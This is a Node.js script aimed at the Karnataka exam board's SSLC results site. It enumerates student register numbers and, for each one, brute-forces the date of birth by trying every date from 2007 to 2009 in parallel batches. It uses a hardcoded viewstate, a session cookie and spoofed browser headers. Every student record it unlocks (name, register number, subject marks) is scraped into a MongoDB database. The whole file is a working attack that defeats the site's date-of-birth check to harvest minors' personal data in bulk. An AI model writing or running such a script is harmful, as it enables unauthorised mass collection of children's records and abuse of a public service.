const cheerio = require("cheerio");
const axios = require("axios");
const qs = require("qs");
const mongoose = require("mongoose");

const mongoURI = "mongodb://127.0.0.1:27017/KSEEB";
mongoose
  .connect(mongoURI)
  .then(() => {
    console.log("Connected to MongoDB");
  })
  .catch((err) => {
    console.error("Error connecting to MongoDB", err);
  });
const markSchema = new mongoose.Schema({
  registerNumber: String,
  studentName: String,
  marks: [
    {
      subject: String,
      maxMarks: String,
      internalMarks: String,
      externalMarks: String,
      totalMarks: String,
      grade: String,
    },
  ],
});
const Mark = mongoose.model("Mark", markSchema);

async function get(applicationNo, day, month, year) {
  let data = qs.stringify({
    ctl00$ContentPlaceHolder1$txtReg: applicationNo,
    ctl00$ContentPlaceHolder1$ddlDay: day,
    ctl00$ContentPlaceHolder1$ddlMonth: month,
    ctl00$ContentPlaceHolder1$ddlYear: year,
    ctl00$ContentPlaceHolder1$btnview: "View+Your+Results",
    __EVENTTARGET: "",
    __EVENTARGUMENT: "",
    __LASTFOCUS: "",
    __VIEWSTATE:
      "/wEPDwUKLTcyMTgzNjc5NA9kFgJmD2QWAgIDD2QWAgIDD2QWAmYPZBYCAgMPZBYCAgEPZBYCZg9kFgQCAQ9kFgICAQ9kFgICAw9kFggCAw8PFgIeBFRleHQFCzIwMjQwMTA3MjU5ZGQCBw8QZBAVIAotLVNlbGVjdC0tAjAxAjAyAjAzAjA0AjA1AjA2AjA3AjA4AjA5AjEwAjExAjEyAjEzAjE0AjE1AjE2AjE3AjE4AjE5AjIwAjIxAjIyAjIzAjI0AjI1AjI2AjI3AjI4AjI5AjMwAjMxFSAKLS1TZWxlY3QtLQIwMQIwMgIwMwIwNAIwNQIwNgIwNwIwOAIwOQIxMAIxMQIxMgIxMwIxNAIxNQIxNgIxNwIxOAIxOQIyMAIyMQIyMgIyMwIyNAIyNQIyNgIyNwIyOAIyOQIzMAIzMRQrAyBnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2RkAgkPEGQQFQ0KLS1TZWxlY3QtLQNKQU4DRkVCA01BUgNBUFIDTUFZA0pVTgNKVUwDQVVHA1NFUANPQ1QDTk9WA0RFQxUNCi0tU2VsZWN0LS0CMDECMDICMDMCMDQCMDUCMDYCMDcCMDgCMDkCMTACMTECMTIUKwMNZ2dnZ2dnZ2dnZ2dnZ2RkAgsPEA8WBh4NRGF0YVRleHRGaWVsZAUIWWVhcl92YWweDkRhdGFWYWx1ZUZpZWxkBQlZZWFyX1RleHQeC18hRGF0YUJvdW5kZ2QQFUAKLS1TZWxlY3QtLQQyMDE0BDIwMTMEMjAxMgQyMDExBDIwMTAEMjAwOQQyMDA4BDIwMDcEMjAwNgQyMDA1BDIwMDQEMjAwMwQyMDAyBDIwMDEEMjAwMAQxOTk5BDE5OTgEMTk5NwQxOTk2BDE5OTUEMTk5NAQxOTkzBDE5OTIEMTk5MQQxOTkwBDE5ODkEMTk4OAQxOTg3BDE5ODYEMTk4NQQxOTg0BDE5ODMEMTk4MgQxOTgxBDE5ODAEMTk3OQQxOTc4BDE5NzcEMTk3NgQxOTc1BDE5NzQEMTk3MwQxOTcyBDE5NzEEMTk3MAQxOTY5BDE5NjgEMTk2NwQxOTY2BDE5NjUEMTk2NAQxOTYzBDE5NjIEMTk2MQQxOTYwBDE5NTkEMTk1OAQxOTU3BDE5NTYEMTk1NQQxOTU0BDE5NTMEMTk1MhVACi0tU2VsZWN0LS0EMjAxNAQyMDEzBDIwMTIEMjAxMQQyMDEwBDIwMDkEMjAwOAQyMDA3BDIwMDYEMjAwNQQyMDA0BDIwMDMEMjAwMgQyMDAxBDIwMDAEMTk5OQQxOTk4BDE5OTcEMTk5NgQxOTk1BDE5OTQEMTk5MwQxOTkyBDE5OTEEMTk5MAQxOTg5BDE5ODgEMTk4NwQxOTg2BDE5ODUEMTk4NAQxOTgzBDE5ODIEMTk4MQQxOTgwBDE5NzkEMTk3OAQxOTc3BDE5NzYEMTk3NQQxOTc0BDE5NzMEMTk3MgQxOTcxBDE5NzAEMTk2OQQxOTY4BDE5NjcEMTk2NgQxOTY1BDE5NjQEMTk2MwQxOTYyBDE5NjEEMTk2MAQxOTU5BDE5NTgEMTk1NwQxOTU2BDE5NTUEMTk1NAQxOTUzBDE5NTIUKwNAZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2RkAgMPZBYEAg0PPCsAEQIBEBYAFgAWAAwUKwAAZAIPDzwrABEBDBQrAABkGAIFI2N0bDAwJENvbnRlbnRQbGFjZUhvbGRlcjEkR3JpZFZpZXcxD2dkBSBjdGwwMCRDb250ZW50UGxhY2VIb2xkZXIxJEdyaWRQRw9nZGRkYlSskWdTpW7eeAYEGoVifnm4ZXAatohuncHcjsvn",
    __VIEWSTATEGENERATOR: "1887E842",
  });
  let config = {
    method: "post",
    maxBodyLength: Infinity,
    url: "https://kseeb.karnataka.gov.in/karsslcexam1/",
    headers: {
      Accept:
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
      "Accept-Language": "en-US,en;q=0.9",
      "Cache-Control": "max-age=0",
      Connection: "keep-alive",
      "Content-Type": "application/x-www-form-urlencoded",
      Cookie:
        "AlteonP=DqocALodCgoxBr45X5ZEfg$$; AlteonP=E76sYrodCgpauo5jhJjXQw$$",
      Origin: "https://kseeb.karnataka.gov.in",
      Referer: "https://kseeb.karnataka.gov.in/karsslcexam1/",
      "Sec-Fetch-Dest": "document",
      "Sec-Fetch-Mode": "navigate",
      "Sec-Fetch-Site": "same-origin",
      "Sec-Fetch-User": "?1",
      "Upgrade-Insecure-Requests": "1",
      "User-Agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0",
      "sec-ch-ua":
        '"Not/A)Brand";v="8", "Chromium";v="126", "Microsoft Edge";v="126"',
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-platform": '"Windows"',
    },
    data: data,
  };
  const response = await axios.request(config);
  const parsedData = parseHTML(response.data);
  return parsedData;
}
function parseHTML(response) {
  const $ = cheerio.load(response);
  $("h2.title").text("Hello there!");
  $("h2").addClass("welcome");
  const registerNumber = $("#ContentPlaceHolder1_lblRegisNo").text().trim();
  const studentName = $("#ContentPlaceHolder1_lblStudentName").text().trim();
  const marks = [];
  $("#ContentPlaceHolder1_GridPG tbody tr").each((index, element) => {
    const subject = $(element).find("td:nth-child(1)").text().trim();
    const maxMarks = $(element).find("td:nth-child(2)").text().trim();
    const internalMarks = $(element).find("td:nth-child(3)").text().trim();
    const externalMarks = $(element).find("td:nth-child(4)").text().trim();
    const totalMarks = $(element).find("td:nth-child(5)").text().trim();
    const grade = $(element).find("td:nth-child(6)").text().trim();
    if (subject) {
      marks.push({
        subject,
        maxMarks,
        internalMarks,
        externalMarks,
        totalMarks,
        grade,
      });
    }
  });
  const result = {
    registerNumber,
    studentName,
    marks,
  };
  if (result.registerNumber === "") {
    return null;
  }
  return result;
}
let n = 0;
async function Main(reg) {
  let found = false;
  for (let year = 2007; year <= 2009; year++) {
    console.log(reg, year, "Found: ", n);
    if (found) {
      break;
    }
    for (let month = 1; month <= 12; month++) {
      if (found) {
        break;
      }
      const promiseData = [];
      let monthStr = month.toString().padStart(2, "0");
      for (let day = 1; day <= 31; day++) {
        let dayStr = day.toString().padStart(2, "0");
        const prom = get(reg, dayStr, monthStr, year);
        promiseData.push(prom);
      }
      const resolved = await Promise.all(promiseData);
      resolved.forEach(async (data) => {
        if (data) {
          n += 1;
          found = true;
          try {
            const newMark = new Mark(data);
            await newMark.save();
            console.log("Data saved to MongoDB");
          } catch (error) {
            console.error("Error saving data to MongoDB", error);
          }
        }
      });
    }
  }
}
async function scrapeData() {
  for (let i = 100146; i <= 9999999; i++) {
    let regNo = "2024" + i.toString().padStart(7, "0");
    await Main(regNo);
  }
}
scrapeData();
